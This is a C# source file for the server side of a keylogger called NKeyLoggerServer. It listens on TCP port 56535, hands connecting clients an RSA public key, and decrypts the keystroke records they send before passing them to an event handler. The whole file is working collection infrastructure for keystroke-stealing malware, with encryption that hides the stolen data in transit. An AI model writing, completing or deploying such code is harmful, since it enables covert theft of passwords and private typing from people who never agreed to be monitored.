using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection.Metadata.Ecma335;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using NKeyLoggerLib;
using static System.Runtime.InteropServices.JavaScript.JSType;
using static NKeyLoggerServer.Server;

namespace NKeyLoggerServer;
internal class Server : IDisposable
{
    private IPEndPoint ipPoint { get; set; } = new IPEndPoint(IPAddress.Any, 56535);
    private readonly Network network = new Network();
    private readonly RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(0x1000);
    private bool isStart = false;
    private ConcurrentDictionary<Network, Task> connections = new ConcurrentDictionary<Network, Task>();
    private const int clearConnctionElipse = 0xFFFE;
    private System.Timers.Timer checkClearConnectionTimer = new System.Timers.Timer(clearConnctionElipse);
    public Server()
    {
        init();
    }

    private void init()
    {
        network.socket.Bind(ipPoint);
        network.socket.Listen();
        checkClearConnectionTimer.Elapsed += (sender, e) =>
            connections.Select( (KeyValuePair<Network,Task> el) =>
            {
                if (!el.Key.socket.Connected)
                    return el.Key;
                return null;
            }).ToList().ForEach( (Network? n) =>
            {
                if (n != null)
                {
                    connections.Remove(n, out _);
                }
            });
        checkClearConnectionTimer.Start();
    }

    public async Task start()
    {
        if (isStart)
            return;

        isStart = true;

        while (isStart)
        {
            var socket = await network.socket.AcceptAsync();
            Network clientNet = new Network(socket);
            var connectionTask = Task.Factory.StartNew( async () => {
                try
                {
                    await clientNet.send(rsa.ExportRSAPublicKey(), Network.Type.CRYPTOKEY);
                    await read(clientNet);
                } catch (SocketException)
                {
                    //TODO
                }catch (Exception ex)
                {
                    //TODO
                }
            });
            connections[clientNet] = connectionTask;
        }
    }

    public void stop()
    {
        isStart = false;
        foreach (var item in connections)
        {
            item.Key.Dispose();
        }
        var taskList = connections.Values;
        Task.WaitAll(taskList);
        connections.Clear();
    }

    private void stop(Network socketSuppler)
    {
        connections.Remove(socketSuppler, out _);
        socketSuppler.Dispose();
    }
    private async Task read(Network clientNet)
    {
        try
        {
            if (clientNet == null)
                throw new ArgumentNullException("Network is null");
            while (isStart)
            {
                var result = await clientNet.recv();
                switch (result.type)
                {
                    case Network.Type.KEY: TakeKey(result.data, clientNet); break;
                    case Network.Type.INFO: TakeInfo(result.data, clientNet); break;
                }
            }
        } catch (SocketException e)
        {
            stop(clientNet);
            //TODO
        }
    }

    private void TakeKey(List<byte> data, Network client)
    {
        AbstractKeyInfo keyInfo = new KeyInfo();
        byte[] decryptData = rsa.Decrypt(data.ToArray(), false);
        keyInfo.FromBytes(decryptData);
        keyHandler?.Invoke(this, client, keyInfo);
    }

    private void TakeInfo(List<byte> data, Network client)
    {
        //TODO
    }

    ~Server()
    {
        Dispose();
    }

    public void Dispose()
    {
        stop();
        network.Dispose();
        rsa.Dispose();
    }

    public event KeyHandler? keyHandler;
    public delegate void KeyHandler(Server sender, Network clientNet, AbstractKeyInfo keyInfo);
}
